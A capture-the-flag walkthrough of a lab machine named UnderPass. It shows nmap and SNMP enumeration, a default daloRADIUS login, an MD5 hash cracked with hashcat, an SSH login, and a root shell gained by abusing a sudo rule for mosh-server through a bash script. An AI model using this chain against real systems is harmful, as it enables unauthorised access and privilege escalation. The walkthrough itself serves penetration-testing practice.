# User flag
## 1. rustscan
```python
# Nmap 7.94SVN scan initiated Wed Mar 26 01:49:39 2025 as: /usr/lib/nmap/nmap --privileged -vvv -p 22,80 -sC -sV -oN underpass 10.129.215.241
Nmap scan report for 10.129.215.241
Host is up, received echo-reply ttl 63 (0.23s latency).
Scanned at 2025-03-26 01:49:46 EDT for 18s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK+kvbyNUglQLkP2Bp7QVhfp7EnRWMHVtM7xtxk34WU5s+lYksJ07/lmMpJN/bwey1SVpG0FAgL0C/+2r71XUEo=
|   256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ8XNCLFSIxMNibmm+q7mFtNDYzoGAJ/vDNa6MUjfU91
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## 2. UDP scan

```python
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sU 10.129.215.241 --min-rate 500 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-26 01:59 EDT
Warning: 10.129.215.241 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.215.241
Host is up (0.24s latency).
Not shown: 971 open|filtered udp ports (no-response), 28 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp
```

## 3. SNMPwalk
```
┌──(kali㉿kali)-[~]
└─$ snmpwalk -c public -v 2c 10.129.215.241
iso.3.6.1.2.1.1.1.0 = STRING: "Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (111827) 0:18:38.27
iso.3.6.1.2.1.1.4.0 = STRING: "steve@underpass.htb"
iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only daloradius server in the basin!"
```

## 4. daloradius server

`Default credential: administrator/radius`
![[Pasted image 20250326151952.png]]

```python
# crack the hash
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 412dd4759978acfcc81deab01b382403
Time.Started.....: Wed Mar 26 02:51:46 2025 (1 sec)
Time.Estimated...: Wed Mar 26 02:51:47 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2265.0 kH/s (0.20ms) @ Accel:512 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2985984/14344385 (20.82%)
Rejected.........: 0/2985984 (0.00%)
Restore.Point....: 2982912/14344385 (20.79%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: ungidas -> unc112886
Hardware.Mon.#1..: Util: 36%
```

## 5. Get shell with ssh
```
┌──(kali㉿kali)-[~]
└─$ ssh svcMosh@underpass.htb

svcMosh@underpass:~$ ls
user.txt
```

# Root flag
## 1. sudo -l 
```python
svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
```

## 2. get shell

```bash
#!/bin/bash 
port=`sudo /usr/bin/mosh-server 2>&1|grep CONNECT| awk -F' ' '{ print $3,$4}'`
key=`echo $port|awk -F' ' '{ print $2}'` port=`echo $port|awk -F' ' '{ print $1}'` 

echo $port
echo $key 

MOSH_KEY=$key 
mosh-client 127.0.0.1 $port
```